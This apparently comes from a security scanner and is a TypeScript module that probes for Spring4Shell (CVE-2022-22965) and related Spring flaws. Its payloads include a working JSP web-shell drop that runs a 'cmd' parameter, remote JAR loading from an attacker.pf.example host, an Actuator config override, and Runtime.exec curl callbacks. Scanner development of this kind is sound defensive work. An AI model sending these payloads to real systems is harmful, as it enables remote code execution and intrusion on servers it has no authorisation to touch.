// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'spring4shell',
  family: 'cve-named',
  title: 'Spring4Shell CVE-2022-22965 (Spring MVC RCE)',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['query', 'body'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure', 'status-delta'],
  cwe: [94],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'sp4sh-class-module',
      family: 'cve-named',
      value: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(new%20String[]%7Brequest.getParameter(%22cmd%22)%7D).getInputStream()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=pf_shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
      encoding: 'url',
      intent: 'Spring4Shell Tomcat JSP shell drop via ClassLoader binding (CVE-2022-22965)',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'sp4sh-class-module-oast',
      family: 'cve-named',
      value: `class.module.classLoader.resources.context.parent.pipeline.first.pattern=curl+http://${oastHost}/pf-sp4sh`,
      encoding: 'url',
      intent: 'Spring4Shell with OAST callback via curl in log pattern',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sp4sh-get-param',
      family: 'cve-named',
      value: 'class.module.classLoader.URLs[0]=https://attacker.pf.example/malicious.jar',
      encoding: 'url',
      intent: 'ClassLoader URL injection to load remote JAR (Spring CVE-2022-22965 variant)',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sp4sh-actuator-env',
      family: 'cve-named',
      value: '{"name":"spring.cloud.bootstrap.location","value":"https://attacker.pf.example/malicious"}',
      encoding: 'json-string',
      intent: 'Spring Actuator /env property injection — remote config source override (related CVE)',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sp4sh-cve-22963-el',
      family: 'cve-named',
      value: 'spring.io.path=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22curl+http%3A%2F%2F' + encodeURIComponent(oastHost) + '%2Fpf-22963%22%29%7D',
      encoding: 'url',
      intent: 'CVE-2022-22963 Spring Cloud Function EL injection via routing expression',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'sp4sh-classloader-probe',
      family: 'cve-named',
      value: 'class.module.classLoader.defaultAssertionStatus',
      encoding: 'url',
      intent: 'ClassLoader property probe — 400/500 response confirms Spring MVC DataBinder exposure',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const body = resp.bodyText.toLowerCase();
  const springError = body.includes('spring') || body.includes('classloader') ||
    body.includes('typemismatchexception') || body.includes('invalidpropertyexception');

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('Spring4Shell OAST probe dispatched');
  } else if (springError && resp.statusCode >= 400) {
    responseClass = 'parser-error';
    confidence = 0.7;
    nextAction = 'confirm';
    evidence.push('Spring ClassLoader/DataBinder error in response — CVE-2022-22965 may be applicable');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No Spring4Shell signal — target may be patched or not Spring MVC');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
